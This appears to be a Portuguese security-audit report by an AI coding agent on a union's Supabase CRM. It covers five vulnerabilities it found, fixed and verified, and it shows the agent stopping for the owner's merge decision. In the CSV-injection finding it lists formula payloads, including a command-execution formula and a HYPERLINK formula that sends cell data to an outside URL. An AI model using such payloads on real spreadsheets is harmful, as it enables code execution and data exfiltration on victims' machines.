# RELATÓRIO — ETAPA 07, Portão de Segurança Adversarial

**Data:** 2026-08-21 a 2026-08-24 · **Bench:** `bench/07-seguranca-adversarial` · **Base:** `main`
**Banco de bench:** projeto Supabase `CRM Sindcom - TESTE` (`ikculjjvvyajhfxifuga`), descartável
**Escopo atacado:** todo o schema `public` em produção (29 tabelas + 14 views), os 3 endpoints
públicos (2 RPCs do QR + Edge Function `formulario-filiacao`), o PWA e a exportação CSV.
**Método:** portado do CRM Vitrine (`docs/RELATORIO_ANALISE_VITRINE.md`) · **LLM:** Opus, do início ao fim.

---

## 1. Resumo executivo

O CRM Sindcom chegou a este portão com a suíte de testes verde, `sql/05_hardening.sql` aplicado e
o advisor de segurança limpo. **O ataque deliberado encontrou 5 falhas reais** — uma delas
vazando a base empresarial inteira para qualquer anônimo, **em produção, naquele momento**.

| | |
|---|---|
| Ataques escritos | **49**, em 4 arquivos novos (`tests/adversarial/`) |
| Falhas reais encontradas | **5** |
| Corrigidas e provadas | **5 de 5** |
| Já aplicada em produção | **1** (a crítica, com sua autorização) |
| Achados medidos e aceitos, com motivo | 2 |
| Falsos achados descartados por medição | 3 |
| Regressão que eu mesmo introduzi e corrigi | 1 |
| Suíte final no bench | **159/160** (a única falha é anterior a esta etapa e por falta de dados) |

**O achado crítico apareceu antes de eu escrever um único teste** — só rodando as varreduras de
catálogo que o método do Vitrine prescreve. Isso é a justificativa do portão, medida em vez de
argumentada.

**Onde as falhas se concentraram.** A RLS de tabela — onde o projeto investiu quase todo o
esforço — passou em tudo. As 5 falhas estavam em quatro lugares que a RLS não alcança:

1. **View sem `security_invoker`** (A-01) — view não tem RLS; quem decide é o `GRANT`.
2. **Função exposta como RPC** (A-02) — a RLS não olha `EXECUTE`.
3. **Coluna de credencial** (A-03) — RLS restringe *quais linhas*, nunca *quais colunas*.
4. **Endpoint público sem freio** (A-04) e **saída para fora do sistema** (A-05) — onde a RLS
   simplesmente não participa.

---

## 2. Achados, um a um

### 🔴 A-01 — A base empresarial inteira legível por qualquer anônimo · **CRÍTICO · CORRIGIDO EM PRODUÇÃO**

**Vetor:** V2/V7 · **Medido ao vivo, contra produção:**

```
GET /rest/v1/empresas_estabelecimentos?select=*    (só a anon key, SEM login)
→ HTTP 200
[{"cnpj_completo":"00074569006302","razao_social":"RIO DE JANEIRO REFRESCOS LTDA",
  "capital_social":532134973.45,"email":"JURIDICOBR@KOANDINA.COM", ...}]
```

A view `empresas_estabelecimentos` (join `empresas` × `estabelecimentos`) foi criada **sem
`security_invoker = on`**. Sem essa opção a view roda com os privilégios do dono e **ignora a RLS
das tabelas base** — que estavam corretas: `anon` recebia `[]` em `empresas` e em `trabalhadores`.

Três fatos transformam isso de aviso em vazamento:

1. **A anon key não é segredo** — vai no bundle JS de `crm.sindcompassos.org`.
2. **A view tinha `GRANT SELECT` para `anon`**, privilégio de fábrica do projeto Supabase.
3. **A view não existia em nenhum arquivo do repositório.** Foi criada direto no banco, ao que
   tudo indica como conveniência durante a carga da RFB (ETAPA 06). Por não estar versionada,
   nunca passou por revisão — e as 12 views que *estão* nos arquivos `sql/` têm
   `security_invoker = on`, todas.

**Alcance:** 17.319 estabelecimentos e 16.687 empresas, paginável pelo PostgREST.

**Correção:** `alter view public.empresas_estabelecimentos set (security_invoker = on)`, aplicada
**em produção em 2026-08-21**, com sua autorização, por ser vazamento ativo. Versionada em
`sql/19_hardening_adversarial.sql`.

**Medido depois — inclusive o controle negativo:**

| ator | antes | depois |
|---|---|---|
| `anon` (sem login) | **dados reais** | `[]` |
| Admin | 2 linhas | 2 linhas ✅ |
| Secretaria | 2 linhas | 2 linhas ✅ |
| Parceiro | 2 linhas ⚠️ | 0 linhas ✅ |

O parceiro — que é externo ao sindicato — **também** estava lendo a base empresarial. A mesma
falha, um degrau abaixo.

---

### 🟠 A-04 — Força bruta do PIN no endpoint público, sem freio nenhum · **ALTO · CORRIGIDO NO BENCH**

**Vetor:** V6 · **Medido ao vivo:**

```
[força bruta do PIN] 15 tentativas em 731ms (49ms por tentativa)
                     — 15 recusas simples, 0 bloqueios
```

`fn_registrar_checkin` é executável por `anon` **por design** (é a página do QR, que não tem
login). O PIN tem de 4 a 6 dígitos (`fn_definir_pin_recepcionista` valida `^\d{4,6}$`): **10.000
candidatos no caso de 4 dígitos**. A 49ms por tentativa, o espaço inteiro cai em **~8 minutos em
série** — e nada impedia paralelizar.

**O que o atacante ganha:** marcar guias como `executada`. É o check-in que autoriza o convênio a
cobrar do sindicato — fraude financeira direta, sem precisar de login em lugar nenhum.

**Correção:** freio por **token**, não por parceiro — bloquear o parceiro inteiro deixaria alguém
derrubar o balcão de um convênio legítimo só errando o PIN de propósito, trocando uma fraude por
uma negação de serviço. Cinco falhas em 15 minutos travam aquele token por 15 minutos.

**A primeira versão da correção não funcionou, e o teste provou.** `RAISE EXCEPTION` aborta a
transação inteira — e levava junto, no rollback, o `INSERT` que registrava a tentativa. O contador
nunca saía de zero. Como não existe transação autônoma em plpgsql, a recusa passou a ser um
**resultado** (`{"ok": false, "erro": …}`) em vez de uma exceção. `GuiaPublicaPage.tsx` e quatro
casos de `tests/rls/solicitacoes.spec.ts` acompanharam o contrato novo.

**Medido depois:** `15 tentativas — 5 recusas simples, 10 bloqueios`. O ataque fecha na 6ª.

---

### 🟠 A-03 — Hash do PIN legível pelos cinco papéis · **ALTO · CORRIGIDO NO BENCH**

**Vetor:** V6 · **Medido:** `recepcionistas.pin_hash` é legível por **admin, presidente,
secretaria, juridico e parceiro** — os cinco. Com o hash em mãos, os 10⁴–10⁶ candidatos de PIN
caem offline, sem tocar no servidor e sem disparar nenhum alarme. Somado ao A-04, é o caminho
completo para o check-in fraudulento.

O parceiro, que é externo, lê o hash das próprias recepcionistas.

> **Como este achado apareceu:** não por leitura de código, mas pela **varredura de catálogo por
> nome de coluna** (`column_name ~* 'secret|senha|token|hash|chave|pin|…'` cruzada com
> `has_column_privilege`) — a técnica que o Vitrine promoveu depois de o quarto achado dele só ter
> aparecido assim. Repetir essa varredura a cada schema novo é mais confiável que reler migration
> por migration.

**Correção:** narrowing de coluna, no padrão da migration 022 do Vitrine — `REVOKE SELECT` da
tabela e `GRANT SELECT` só nas colunas que não são credencial, **com a lista derivada do catálogo**
em vez de escrita à mão (coluna nova entra sozinha, sem reabrir a migration).

**Consequência aceita e medida:** `select('*')` em `recepcionistas` passa a devolver `42501`, que
*parece* falha de RLS e desvia a investigação. `src/features/parceiros/api.ts` foi ajustado para
listar colunas explicitamente, e a armadilha está registrada em `orientacoes.md`.

**Controle negativo:** `admin` continua lendo `id`/`nome`/`ativo` para operar a tela;
`service_role` continua lendo tudo, porque é quem legitimamente opera a credencial.

---

### 🟡 A-05 — Injeção de fórmula no CSV exportado · **MÉDIO/ALTO · CORRIGIDO NO BENCH**

**Vetor:** V3 · O caminho existe inteiro, e é o que torna este achado mais sério do que parece:

1. o formulário público de filiação (Edge Function, **sem login**) grava `nome_completo` em
   `trabalhadores.nome` sem sanitizar;
2. a Secretaria exporta a listagem pelo botão "Exportar CSV";
3. o Excel e o LibreOffice avaliam como **fórmula** toda célula que comece com `=`, `+`, `-`,
   `@`, TAB ou CR — inclusive dentro de aspas, porque as aspas são do formato CSV e somem no parse.

Ou seja: **entrada anônima → banco → planilha da Denise**. Um nome cadastrado como
`=HYPERLINK("http://…/?d="&A1,"clique")` executa na máquina dela.

**Medido:** os 8 payloads (`=1+1`, `=cmd|'/c calc'!A1`, `=HYPERLINK(…)`, `+`, `-`, `@`, TAB, CR)
saíam todos literais de `lib/csv.ts`.

**Correção:** `neutralizarFormula()` prefixa `'` quando o valor começa com um desses caracteres —
o Excel consome o apóstrofo e trata o resto como texto.

**Controle negativo:** dado legítimo não é alterado, e **valor negativo continua legível** — que é
o caso legítimo mais comum aqui, já que o CRM exporta dinheiro.

---

### 🟡 A-02 — `fn_gera_numero_guia()` chamável por RPC queima a numeração · **MÉDIO · CORRIGIDO NO BENCH**

**Vetor:** V2 · **Medido:** qualquer papel autenticado — **inclusive o parceiro**, que é externo —
executa `POST /rest/v1/rpc/fn_gera_numero_guia` e recebe um número novo. A função faz
`nextval('seq_numero_guia')`, então **cada chamada consome a numeração**: em loop, a próxima guia
real sai como `2026-847392`. Não corrompe dado, mas destrói a sequência de um documento de
cobrança — que é o que lhe dá rastreabilidade — e revela quantas guias já foram emitidas.

**Por que revogar não bastava:** a função era o `DEFAULT` da coluna `numero_guia`, e o `DEFAULT`
roda com os privilégios de quem insere. Revogar sozinho impediria a Secretaria de criar guia.

**Correção:** a numeração saiu do `DEFAULT` e virou trigger `BEFORE INSERT`. Função de trigger
devolve `trigger`, tipo que o PostgREST não representa — deixa de existir como RPC — e não exige
`EXECUTE` de quem insere.

**Regressão que eu mesmo introduzi, e como ela apareceu.** A primeira versão do trigger era
`SECURITY INVOKER`: rodava com os privilégios de quem inseria, e como o `EXECUTE` acabara de ser
revogado, **a Secretaria deixou de conseguir criar guia**. Doze testes da suíte existente ficaram
vermelhos com `permission denied for function fn_gera_numero_guia`. Corrigido para
`SECURITY DEFINER`, dono `postgres`. É o argumento mais concreto a favor de rodar a suíte inteira
depois de cada correção: a correção de segurança quebrou a operação, e só o teste disse isso.

---

## 3. Achados medidos e **aceitos**, com o motivo registrado

### ⚪ `solicitacoes_servico.token_publico` legível por `authenticated`

Chegou a ser tratado como achado; a medição mostrou que **não é corrigível pela mesma via, e não
deve ser**. O token é credencial de *operação*: a Secretaria precisa dele para imprimir e enviar a
guia (`src/features/servicos/GuiaPrint.tsx`). O narrowing de coluna é tudo-ou-nada para o papel
`authenticated` do Postgres — não há como liberar para a Secretaria e negar ao parceiro por essa via.

O que de fato protege é a **RLS de linha**, e ela está correta: cada parceiro só alcança o token
das próprias guias. O teste foi reescrito para afirmar esse invariante, que é o que quebraria se
alguém afrouxasse `pol_solic_select`.

**Reavaliar se** a impressão da guia migrar para uma função `SECURITY DEFINER`.

### ⚪ O token da guia pública **não expira**

Não há coluna de validade em `solicitacoes_servico`. Quem recebeu o link uma vez continua vendo
nome do interessado, serviço, parceiro e valores **para sempre** — inclusive uma recepcionista
desligada, ou qualquer pessoa a quem a guia tenha sido encaminhada.

Não é falha de implementação: nada foi construído errado. É uma decisão que nunca foi tomada
explicitamente. Fica como **pendência de produto**, com um teste que vira vermelho no dia em que
existir expiração, obrigando a atualizar a decisão.

### ⚪ `TRUNCATE` / `REFERENCES` / `TRIGGER` para `anon` e `authenticated` — corrigido, mas **não era explorável**

Os dois papéis tinham os três privilégios nas 43 relações de `public` — privilégio de fábrica do
projeto Supabase, não de migration nossa (achado idêntico ao do Vitrine). `TRUNCATE` **não passa
por RLS**.

**Medido em vez de suposto:** `anon` e `authenticated` têm `rolcanlogin = false` (ninguém se
conecta como elas direto), o PostgREST não tem verbo `TRUNCATE`, e nenhuma das duas tem `CREATE`
em `public` nem no banco — logo não podem criar a função que faria o `TRUNCATE` por dentro.
**Não explorável hoje.**

Revogado assim mesmo: é privilégio que nenhum caminho legítimo usa, e o dia em que uma função
`SECURITY INVOKER` nova apagar linhas, a diferença entre ter e não ter esse `GRANT` é a base
inteira. Custo zero, defesa em profundidade.

---

## 4. O que **resistiu** ao ataque

Vale tanto quanto a lista de falhas, e em alguns pontos o Sindcom saiu melhor que o Vitrine:

- **Escalação de privilégio: nenhuma.** Papel nenhum reescreve o próprio `role`; ninguém cria
  perfil; um usuário autenticado **sem linha em `perfis`** não se cadastra como admin e não
  enxerga absolutamente nada. O A01 do Vitrine — o achado crítico de lá — **não tem análogo aqui**.
- **`trabalhadores.nivel` é coluna GERADA** (`GENERATED ALWAYS` a partir de `recolhe_*`). Nem o
  Admin escreve nela. A regra do `CLAUDE.md` sobre mudança de nível não depende de convenção: está
  imposta pelo banco. E a mudança das colunas-fonte **deixa rastro** em `eventos_nivel`.
- **A trilha de auditoria é imutável.** `UPDATE` e `DELETE` afetam zero linhas mesmo para o Admin;
  contagem 70 → 70 depois do ataque.
- **Isolamento entre parceiros, íntegro** — nas guias, nos benefícios, na `v_fila_parceiro`, no
  CPF (por tabela, por view e por *embedding* do PostgREST) e no próprio check-in: o PIN de um
  parceiro não vale na guia de outro.
- **O trigger `fn_guarda_parceiro_solicitacao` segura tudo o que a RLS não vê**: o parceiro não
  infla `valor_convenio`, não reescreve `numero_guia`, não forja `checkin_em`, não troca o
  trabalhador.
- **Anônimo não lê nem escreve em nenhuma das 29 tabelas**, e não executa nenhuma função interna.
- **XSS armazenado: superfície zero.** Nenhum `dangerouslySetInnerHTML`, nenhum `innerHTML`,
  nenhum `href`/`src` montado a partir de dado. O escape do React não está desligado em lugar nenhum.
- **A Edge Function pública recusa corretamente** sem segredo, com segredo errado, com segredo
  vazio e por `GET` — e não vaza credencial na resposta de erro.
- **O token da guia não é enumerável** (UUID v4) e a página pública não expõe CPF nem contato.
- **Replay de check-in é recusado**; guia já processada não executa duas vezes.

---

## 5. Três falsos achados, descartados por medição

Registro isto porque o rigor do portão depende disso: **um teste adversarial mal escrito produz
falso achado com a mesma facilidade com que produz falso verde**. Todo vermelho foi confirmado por
medição independente antes de virar achado.

| "Achado" | O que a medição mostrou |
|---|---|
| "O Admin apagou uma linha de auditoria" | Bug do meu teste: eu conferia uma coluna inexistente (`dados_novos`, que se chama `dados_depois`), o `select` falhava e `null` foi lido como "a linha sumiu". Medido de novo: `DELETE` e `UPDATE` afetam 0 linhas, contagem 70 → 70. **A auditoria está protegida.** |
| "`configuracoes` vaza para todo papel" | A policy `pol_config_select` autoriza qualquer papel **de propósito**, e a tabela só guarda parâmetros de operação (`dias_vencimento_boleto=30`). O teste foi reescrito para afirmar o que importa: que ninguém guardou segredo numa tabela de leitura ampla, e que só o Admin escreve. |
| "`service_role` citada em arquivo do frontend" | As 5 ocorrências são **comentários dizendo para não usá-la no frontend** — o contrário de um vazamento. O teste passou a procurar o que de fato vaza: um JWT literal. |

E um **falso verde**, que é pior: contra produção, o teste do `token_publico` passou apenas porque
a base ainda não tem guia nenhuma. **Ausência de dado não é prova de proteção.** As asserções de
credencial foram reescritas para afirmar que a coluna é *negada* (`42501`), o que não depende de
haver linhas.

---

## 6. Verificação final

| Verificação | Resultado |
|---|---|
| Suíte completa no **bench**, com todas as correções | **159/160 verdes** |
| A única falha do bench | `cartas.spec.ts` "4 baldes do cenário DEMO Kabum" — **anterior a esta etapa**, causada por falta de dados; falha igualmente em produção |
| Cada correção provada por teste que falhava antes | sim — os 5 ataques ficam na suíte como regressão permanente |
| Controle negativo em cada correção | sim (§2) |
| `npm run typecheck` | limpo |
| `npm run build` | limpo (PWA, 21 entradas) |
| Ataque destrutivo contra produção | **nenhum** — `exigirBench()` recusa por construção, e os arquivos destrutivos são pulados quando o alvo é produção |
| Segredo versionado | nenhum `.env` real rastreado (só `.env.example`); nenhum JWT em `src/` |
| Integridade da base real | intacta: em produção só houve leitura e o `alter view` do A-01 |

**Estado de produção hoje** (o `19` ainda **não** foi aplicado lá): 9 testes vermelhos, sendo
**2 os achados abertos** (A-02 e A-03), **2 os testes de regressão** que provam A-03 (vermelhos
antes da correção, verdes depois — é o que se espera deles), e **5 falhas anteriores a esta
etapa**, alheias ao portão: `dashboard` (2) e `cartas` (3), todas porque a base tem **3
trabalhadores e nenhum aprovado** e os testes esperam números da base antiga.

> ⚠️ **Achado de brinde, fora do escopo de segurança:** a suíte do CRM Sindcom **já não estava
> 100% verde em produção** antes desta etapa. As 5 falhas acima existiam e não haviam sido
> notadas. Não são risco de segurança, mas um portão que se anuncia verde sem estar corrói a
> confiança em todos os outros verdes.

---

## 7. Armadilha de método encontrada no próprio arsenal de teste

Merece destaque porque quase produziu o pior falso verde possível:

**A suíte anunciava `alvo=BENCH` enquanto atacava PRODUÇÃO.** O Vitest (via Vite) carrega `.env` e
`.env.test` sozinho, antes dos helpers, e o `dotenv` **não sobrescreve** o que já existe — então
`SINDCOM_ALVO=bench` trocava os e-mails de teste mas mantinha a URL de produção. Um ataque
destrutivo com o `exigirBench()` esquecido teria rodado contra a base real.

Corrigido com `override: true` no carregamento e com uma **trava dura**: o ref de produção está
cravado no código (não vem de variável de ambiente, justamente para não depender de um `.env`
estar certo), e o helper recusa a carga no import se o alvo pedido não for o alvo real.

Segunda armadilha do mesmo tipo: `loginComo()` chamava `getUser()`, uma requisição de rede por
arquivo por papel — ~65 chamadas em segundos, o bastante para estourar o rate limit de auth e
derrubar a suíte inteira com **"Request rate limit reached"**, sintoma que se disfarça de RLS
quebrada. Agora o uid sai do próprio JWT, decodificado localmente.

Ambas estão registradas em `orientacoes.md`.

---

## 8. Parecer

### ✅ RECOMENDO trazer o bench `bench/07-seguranca-adversarial` para o `main`.

**Fundamento:**

1. As **5 falhas reais estão corrigidas e provadas** — cada uma tem um teste que falhava antes da
   correção e passa depois, e esse teste fica na suíte como regressão permanente.
2. **A mais grave já está fechada em produção** desde 21/08, com controle negativo medido.
3. **Nenhuma regressão sobrevive**: a única que apareceu (o trigger `INVOKER`) foi encontrada pela
   própria suíte e corrigida; a suíte fecha 159/160 no bench.
4. As correções **não são "negar tudo"** — há controle negativo em cada uma provando que o acesso
   legítimo continua funcionando (Admin operando a tela, `service_role` operando os jobs,
   Secretaria criando guia, valor negativo saindo legível no CSV).
5. Os dois achados **não corrigidos foram medidos**, e a decisão de aceitá-los está registrada com
   o critério de reavaliação.
6. O bench **melhora estritamente** a postura de segurança do `main`: fecha um vazamento crítico,
   uma fraude financeira por força bruta, uma exposição de credencial e uma injeção que chega até
   a máquina da Secretaria — sem remover nenhuma capacidade legítima.

**Ressalvas que acompanham o merge, e não o bloqueiam:**

- **`select('*')` quebra em `recepcionistas`** (`42501`, que parece falha de RLS). Já corrigido no
  frontend e registrado em `orientacoes.md`.
- **O contrato de `fn_registrar_checkin` mudou**: a recusa vem em `data.erro`, não mais como
  exceção. `GuiaPublicaPage.tsx` acompanhou; qualquer integração futura precisa saber disso.
- **As 5 falhas anteriores da suíte** (dashboard e cartas) continuam de pé. São de dados, não de
  segurança, mas precisam de decisão sua: restaurar os dados que os testes esperam ou reescrever
  os testes para a base atual.
- **O token da guia não expira** — pendência de produto, registrada.

**A aplicar em produção quando você ordenar o merge:** `sql/19_hardening_adversarial.sql` (o bloco
A-01 é idempotente e já está aplicado) e o deploy do frontend (`lib/csv.ts`,
`parceiros/api.ts`, `GuiaPublicaPage.tsx`).

---

## 9. Parada obrigatória — e o desfecho

**Durante a auditoria, nenhum merge foi executado.** O passo 7 do roteiro e a regra herdada do
Vitrine são explícitos: mesmo com tudo verde e parecer favorável — que era exatamente o caso —,
ordenar o merge é atribuição do Maxwell. O parecer da §8 foi entregue com `main` intocada, e o
banco de produção tinha recebido **apenas** a correção do A-01, autorizada à parte por ser
vazamento ativo.

**Desfecho registrado:** em **2026-08-24**, de posse do relatório, **Maxwell ordenou o merge e o
deploy**. Executados em seguida **por ordem dele, nunca por iniciativa própria** — que é o que a
regra prevê. A distinção que ela protege ficou preservada: o CODE atacou, corrigiu, relatou e
parou; a decisão de fundir foi de quem é dono do projeto.

### O que foi para produção (2026-08-24)

| Passo | Resultado |
|---|---|
| Merge `--no-ff` do bench para `main` | `11ab2d5` |
| Build | limpo (PWA, 21 entradas) |
| Deploy FTP para `crm.sindcompassos.org` | **21/21 arquivos, zero falhas** |
| `sql/19_hardening_adversarial.sql` em produção | 4 migrations, verificadas uma a uma |
| Push de `main` e do bench | feito (bench mantido como registro auditável) |

**Ordem de aplicação, escolhida de propósito: frontend ANTES do SQL.** O frontend novo é compatível
com as duas versões da função de check-in (checa `error` antes de `data.ok`), mas o SQL novo
quebraria o frontend antigo, que fazia `select('*')` em `recepcionistas`. Inverter a ordem abriria
uma janela com a tela de parceiros quebrada.

### Verificação pós-deploy, medida ao vivo

| Verificação | Resultado |
|---|---|
| A-01 · `anon` em `empresas_estabelecimentos` | `[]` |
| A-02 · `fn_gera_numero_guia` por RPC | `42501 permission denied` |
| A-03 · `pin_hash` para `authenticated` | fechada — e `nome` continua aberta (o narrowing não fechou a tabela) |
| A-02 · trigger de numeração | instalado; `DEFAULT` da coluna removido |
| Contrato público preservado | `anon` mantém `EXECUTE` em `fn_registrar_checkin` |
| A-07 · grants de fábrica | **zero** `TRUNCATE`/`REFERENCES`/`TRIGGER` para `anon`/`authenticated` |
| PWA | `GET /` → 200 · `GET /dashboard` (rota profunda) → 200 · assets do build atual |
| **Suíte contra produção** | **155/160 — os 49 ataques adversariais todos verdes** |
| `get_advisors` (security) | nenhum achado novo problemático |

As 5 falhas restantes da suíte são **exatamente as 5 anteriores a esta etapa** (`dashboard` e
`cartas`, por falta de dados na base). Nenhuma regressão foi introduzida pelo deploy.

O único item novo no advisor é `tentativas_checkin` com RLS ligada e **sem policy** — nível INFO e
**deliberado**: ausência de policy nega por padrão, porque só a função `SECURITY DEFINER` e a
`service_role` escrevem ali. Mesmo padrão que o Vitrine registrou para as tabelas de uso interno.

### Lembrete de vigilância (regra do `CLAUDE.md`)

`auth_leaked_password_protection` (HaveIBeenPwned) **continua desativado** — é recurso do plano pago
do Supabase e o projeto segue no Free. Conferido nesta sessão: a migração de plano ainda não
ocorreu. Mitigação atual mantida: política de senha forte no Auth.
